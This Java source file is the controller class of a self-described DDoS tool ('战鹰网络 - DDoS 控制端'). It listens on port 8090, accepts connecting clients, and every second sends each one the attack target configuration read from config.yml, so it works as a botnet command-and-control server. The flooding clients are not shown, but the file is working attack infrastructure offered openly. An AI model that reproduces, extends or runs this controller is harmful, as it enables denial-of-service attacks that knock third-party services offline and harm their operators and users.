package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * @ClassName : Runner
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 3.0
 */

public class Runner extends Thread {
    static Socket socket;
    static Yaml yml = new Yaml();
    static OutputStream os;
    static FileInputStream fis;
    static String path = "config.yml"; // 这个config.yml放在jar文件的同目录 具体配置内容参考源码里的

    public static void main(String[] args) { // 这里负责监听端口
        try {
            File targetConfigPathFirstRunShow = new File(path); // 目标配置文件信息
            long targetConfigLenthFirstRunShow = targetConfigPathFirstRunShow.length();
            byte[] b = new byte[(int) targetConfigLenthFirstRunShow];
            FileInputStream fis = new FileInputStream(targetConfigPathFirstRunShow);
            fis.read(b);
            String targetConfigInfoFirstRunShow = new String(b, "GBK");

            System.out.println("[+] 战鹰网络 - DDoS 控制端：当前目标配置文件信息 ↓");
            System.out.println("[+] 战鹰网络 - DDoS 控制端：" + targetConfigInfoFirstRunShow.replace("\n", "")); // 去除多余的回车符
            ServerSocket serverSocket = new ServerSocket(8090);
            System.out.println("[+] 战鹰网络 - DDoS 控制端：端口监听成功。");
            InputTargetThread i = new InputTargetThread();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标输入模块启动中...");
            i.start();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标输入模块启动成功。");
            while (true) {
                socket = serverSocket.accept();
                Runner runner = new Runner();
                runner.start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() { // 客户端连接就用子线程隔一段时间发送一次目标信息配置文件以保持TCP长连接
        try {
            while (true) {
                File targetConfigPath = new File(path); // 目标配置文件信息
                long targetConfigLenth = targetConfigPath.length();
                byte[] b = new byte[(int) targetConfigLenth];
                fis = new FileInputStream(targetConfigPath);
                fis.read(b);
                String targetConfigInfo = new String(b, "GBK");
                os = socket.getOutputStream();
                os.write(targetConfigInfo.getBytes());
                sleep(1000);
            }
        } catch (Exception ignored) {
            try {
                if (os != null) {
                    fis.close();
                    os.close();
                }
                socket.close();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

}